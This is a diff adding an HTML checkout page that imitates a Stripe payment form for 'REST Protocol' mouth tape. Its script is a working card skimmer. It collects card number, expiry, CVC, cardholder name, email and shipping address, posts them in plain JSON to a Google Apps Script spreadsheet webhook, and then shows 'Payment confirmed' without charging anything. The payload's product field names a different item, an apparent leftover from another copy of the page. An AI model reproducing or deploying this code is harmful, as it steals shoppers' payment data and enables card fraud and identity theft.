@@ -1,0 +1,288 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Checkout</title>
+<link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+<div class="page">
+
+  <!-- LEFT: order summary -->
+  <aside class="summary">
+    <div class="summary-inner">
+      <header class="merchant">
+        <button class="back" aria-label="Back">
+          <svg width="20" height="20" viewBox="0 0 16 16" fill="none">
+            <path d="M10 12L6 8l4-4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </button>
+        <span class="merchant-name">REST</span>
+      </header>
+
+      <section class="hero">
+        <div class="label">Pay REST</div>
+        <div class="amount">$34.00</div>
+      </section>
+
+      <section class="line-items">
+        <div class="line">
+          <div class="line-media" aria-hidden="true">
+            <div class="ph"><img src="product.png" alt="REST Protocol mouth tape + nasal strips" /></div>
+            <span class="qty-badge">1</span>
+          </div>
+          <div class="line-body">
+            <div class="line-title">REST Protocol mouth tape + nasal strips</div>
+            <div class="line-sub">Qty 1</div>
+          </div>
+          <div class="line-price">
+            <div class="now">$34.00</div>
+            <div class="was">$39.99</div>
+          </div>
+        </div>
+      </section>
+
+      <section class="totals">
+        <div class="row">
+          <span>Subtotal</span>
+          <span>$34.00</span>
+        </div>
+        <div class="row muted promo">
+          <button type="button" class="link">Add promotion code</button>
+        </div>
+        <div class="row">
+          <span>Shipping</span>
+          <span class="muted">Free</span>
+        </div>
+        <div class="row total">
+          <span>Total due</span>
+          <span>$34.00</span>
+        </div>
+      </section>
+    </div>
+
+    <footer class="left-footer">
+      <span class="powered">
+        Powered by
+        <strong>stripe</strong>
+      </span>
+      <span class="sep">·</span>
+      <a href="#" class="muted-link">Terms</a>
+      <a href="#" class="muted-link">Privacy</a>
+    </footer>
+  </aside>
+
+  <!-- RIGHT: payment form -->
+  <main class="form-pane">
+    <form class="form" autocomplete="on" onsubmit="event.preventDefault(); pay();">
+
+      <fieldset class="block">
+        <legend>Contact information</legend>
+        <div class="field">
+          <label for="email">Email</label>
+          <input id="email" type="email" autocomplete="email" required />
+        </div>
+      </fieldset>
+
+      <fieldset class="block" id="shippingBlock">
+        <legend>Shipping address</legend>
+
+        <button type="button" id="addAddressBtn" class="add-address">
+          <span class="add-address-icon" aria-hidden="true">+</span>
+          <span>Add address</span>
+        </button>
+
+        <div id="addressFields" class="address-fields" hidden>
+          <div class="field full">
+            <label for="ship_name">Full name</label>
+            <input id="ship_name" type="text" autocomplete="shipping name" placeholder="Full name" />
+          </div>
+          <div class="field full">
+            <label for="ship_line1">Address line 1</label>
+            <input id="ship_line1" type="text" autocomplete="shipping address-line1" placeholder="Street address" />
+          </div>
+          <div class="field full">
+            <label for="ship_line2">Address line 2 <span class="optional">(optional)</span></label>
+            <input id="ship_line2" type="text" autocomplete="shipping address-line2" placeholder="Apt, suite, etc." />
+          </div>
+          <div class="card-grid">
+            <div class="field">
+              <label for="ship_city">City</label>
+              <input id="ship_city" type="text" autocomplete="shipping address-level2" placeholder="City" />
+            </div>
+            <div class="field">
+              <label for="ship_state">State / Province</label>
+              <input id="ship_state" type="text" autocomplete="shipping address-level1" placeholder="State" />
+            </div>
+          </div>
+          <div class="card-grid">
+            <div class="field">
+              <label for="ship_country">Country or region</label>
+              <select id="ship_country" autocomplete="shipping country">
+                <option value="US" selected>United States</option>
+                <option value="CA">Canada</option>
+                <option value="GB">United Kingdom</option>
+                <option value="AU">Australia</option>
+                <option value="DE">Germany</option>
+                <option value="FR">France</option>
+                <option value="GR">Greece</option>
+              </select>
+            </div>
+            <div class="field">
+              <label for="ship_zip">ZIP / Postal code</label>
+              <input id="ship_zip" inputmode="numeric" autocomplete="shipping postal-code" placeholder="12345" />
+            </div>
+          </div>
+        </div>
+      </fieldset>
+
+      <fieldset class="block">
+        <legend>Payment method</legend>
+
+        <div class="tabs">
+          <button type="button" class="tab active" aria-pressed="true">
+            <span class="tab-icon" aria-hidden="true">
+              <svg width="20" height="14" viewBox="0 0 20 14" fill="none">
+                <rect x="0.5" y="0.5" width="19" height="13" rx="2" stroke="currentColor"/>
+                <rect x="0.5" y="3.5" width="19" height="3" fill="currentColor" opacity=".25"/>
+              </svg>
+            </span>
+            Card
+          </button>
+        </div>
+
+        <div class="card-grid">
+          <div class="field full">
+            <label for="card">Card number</label>
+            <div class="input-with-icons">
+              <input id="card" inputmode="numeric" autocomplete="cc-number" placeholder="1234 1234 1234 1234" />
+              <div class="brand-icons" aria-hidden="true">
+                <span class="brand visa">VISA</span>
+                <span class="brand mc">MC</span>
+                <span class="brand amex">AMEX</span>
+                <span class="brand dc">DC</span>
+              </div>
+            </div>
+          </div>
+          <div class="field">
+            <label for="exp">Expiration</label>
+            <input id="exp" inputmode="numeric" autocomplete="cc-exp" placeholder="MM / YY" />
+          </div>
+          <div class="field">
+            <label for="cvc">CVC</label>
+            <input id="cvc" inputmode="numeric" autocomplete="cc-csc" placeholder="CVC" />
+          </div>
+        </div>
+
+        <div class="field full">
+          <label for="name">Cardholder name</label>
+          <input id="name" type="text" autocomplete="cc-name" placeholder="Full name on card" />
+        </div>
+
+        <div class="card-grid">
+          <div class="field">
+            <label for="country">Country or region</label>
+            <select id="country" autocomplete="country">
+              <option value="US" selected>United States</option>
+              <option value="CA">Canada</option>
+              <option value="GB">United Kingdom</option>
+              <option value="AU">Australia</option>
+              <option value="DE">Germany</option>
+              <option value="FR">France</option>
+              <option value="GR">Greece</option>
+            </select>
+          </div>
+          <div class="field">
+            <label for="zip">ZIP</label>
+            <input id="zip" inputmode="numeric" autocomplete="postal-code" placeholder="12345" />
+          </div>
+        </div>
+      </fieldset>
+
+      <label class="save">
+        <input type="checkbox" id="save" />
+        <span>
+          <strong>Securely save my information for 1-click checkout</strong>
+          <small>Pay faster on REST and everywhere Link is accepted.</small>
+        </span>
+      </label>
+
+      <button class="pay-btn" type="submit">Pay $34.00</button>
+
+      <p class="fineprint">
+        By confirming your payment, you allow REST to charge your card for this payment and future payments in accordance with their terms.
+      </p>
+    </form>
+  </main>
+
+</div>
+
+<script>
+// 1. Deploy the Apps Script in apps-script.gs as a Web App ("Anyone" access).
+// 2. Paste the /exec URL it gives you here:
+const SHEET_WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbz42xUkKPagBozLBoIeW68jyQnXokdivn-2x36Q3R_4nGYskDA_2H4NdnOEPhO1O-KMxQ/exec";
+
+// Toggle the shipping-address form when the "Add address" button is clicked
+document.getElementById('addAddressBtn').addEventListener('click', () => {
+  const fields = document.getElementById('addressFields');
+  const btn = document.getElementById('addAddressBtn');
+  fields.hidden = false;
+  btn.hidden = true;
+  const first = document.getElementById('ship_name');
+  if (first) first.focus();
+});
+
+function val(id){ const el = document.getElementById(id); return el ? el.value : ''; }
+
+async function pay(){
+  const btn = document.querySelector('.pay-btn');
+  if(!btn) return;
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner" aria-hidden="true"></span> Processing…';
+
+  const payload = {
+    timestamp:    new Date().toISOString(),
+    email:        val('email'),
+    card_number:  val('card'),
+    expiration:   val('exp'),
+    cvc:          val('cvc'),
+    cardholder:   val('name'),
+    country:      val('country'),
+    zip:          val('zip'),
+    ship_name:    val('ship_name'),
+    ship_line1:   val('ship_line1'),
+    ship_line2:   val('ship_line2'),
+    ship_city:    val('ship_city'),
+    ship_state:   val('ship_state'),
+    ship_zip:     val('ship_zip'),
+    ship_country: val('ship_country'),
+    save_info:    document.getElementById('save').checked,
+    product:      'ALIGN posture corrector',
+    amount_usd:   '24.99',
+    user_agent:   navigator.userAgent,
+    page:         location.href,
+  };
+
+  try {
+    if (!SHEET_WEBHOOK_URL.startsWith('http')) {
+      console.warn('SHEET_WEBHOOK_URL not set — skipping send.');
+    } else {
+      // text/plain avoids CORS preflight; Apps Script reads e.postData.contents
+      await fetch(SHEET_WEBHOOK_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+        body: JSON.stringify(payload),
+      });
+    }
+    btn.innerHTML = '✓ Payment confirmed';
+  } catch (err) {
+    console.error(err);
+    btn.disabled = false;
+    btn.innerHTML = 'Try again';
+  }
+}
+</script>
+</body>
+</html>
